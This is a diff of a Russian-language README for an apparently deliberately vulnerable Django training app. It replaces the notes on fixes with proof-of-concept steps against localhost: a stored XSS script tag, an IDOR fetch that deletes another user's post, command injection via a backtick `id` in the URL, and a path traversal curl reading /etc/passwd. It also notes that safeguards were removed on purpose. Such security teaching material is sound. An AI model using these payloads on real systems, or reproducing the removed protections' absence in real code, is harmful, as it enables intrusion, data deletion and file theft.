@@ -15,40 +15,62 @@ python vulnapp/manage.py runserver
 
 Далее можно создавать посты которые увидят другие пользователи.
 
-### Комментарии к исправлениям
-> Основные идеи исправлений для реализованных уязвимостей нужно описать в этом разделе.
+### Proof of Concept
 #### XSS
-Уязвимость XSS появляется тк мы хотим рендерить в контенте сообщений не только просто текст, а хотим потом прикрутить туда WYSIWYG редактор.
-Тк WYSIWYG редактор отправляет контент в виде чистого HTML, то если его не санитизировать то будет Stored-XSS.
-
-Для санитайзинга использовал мозиловский bleach:
+Чтобы стригерить XSS надо просто наажать "Create new post", выбрать какуюнить картинку и в текстовое поле вставить html код. 
 
 ```
-    def form_valid(self, form):
-        # Set the owner of the model instance to the current user
-        form.instance.owner = self.request.user
-        form.instance.content = bleach.clean(form.instance.content)
-        return super().form_valid(form)
+<script>alert()</script>
 ```
+При заходе на главную страницу код исполнится.
+
 #### IDOR
-На сайте есть возможность удалять сообщения. Для этого посылается POST запрос на delete/<int:pk>. Тк айди можно послать чужого сообщения, то получится что чужой пользователь может удалить сообщение. Для этого я реализовал проверку ```obj.owner != self.request.user```.
+Создаем собственное сообщение, и открываем devtools вкладку сеть. Удаляем собственное сообщение, и нажимаем на запрос copy as fetch. Через другой аккаунт создаем чужое сообщение которое хотим удалить, либо удалям уже существующее. с дампа БД должны быть мои сообщения, например айди 15.
 
-Для проверки IDOR можно зарегать 2 аккаунта, и создать сообщение которое надо удалить. Потом через devtools можно скопировать copy as curl, и заменить ID картинки на чужой.
+```
+await fetch("http://127.0.0.1:8000/delete/15", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1"
+    },
+    "referrer": "http://127.0.0.1:8000/",
+    "method": "POST",
+    "mode": "cors"
+});
+```
+
+В самом интерфейсе я специально оставил функцию убирания кнопки, чтобы это было как настоящий IDOR бекенда.
 #### SQLI
 Тк использовал ORM для всех запросов, то инъекций нету.
 #### OS command injection
-Тк exiftool subprocess.run запускается без shell=True, то инъекция команд невозможна.
-#### Path Traversal
-Для фикса проблем с траверсалом использовал метод белого списка. Перед тем как отдать контент, проверяется если имя файла есть в БД.
-```
-    image_found_in_db = BoardPost.objects.filter(image='user_uploads/'+file_name).first()
-    if not image_found_in_db:
-        return HttpResponse("Filename not allowed", status=403)
-```
+Берем любую картинку которую загрузили, нажимаем copy url. И меняем user_uploads на get_exif_data:
 
-Тк exiftool в get_exif_data запускается от недоверенных путей, то в него тоже добавил проверку на path traversal.
+127.0.0.1:8000/get_exif_data/cartinka.jpg
+
+Тк используется shell=True, и испльзуется простое прибавление строк, то можно просто:
+
+http://127.0.0.1:8000/get_exif_data/%60id%60
+
+Это например исполнит команду id.
+#### Path Traversal
+Тк была убрана проверка белого списка БД на пути + путь к файлу берется из параметра запроса:
+```
+curl http://127.0.0.1:8000/user_uploads/?path=../../../../../etc/passwd
+```
+то теперь можно 
+
 #### Brute force
 Использовал Django-axe он ставит ограничения на скорость попыток по айпи. В джанге встроенная парольная политика очень жесткая, поэтому брутфорс невозможен.
 
 ### Дополнительные комментарии
 Для простоты проверки на IDOR я выключил CSRF милдлварь.
+
+Дебаг в проде это плохо.
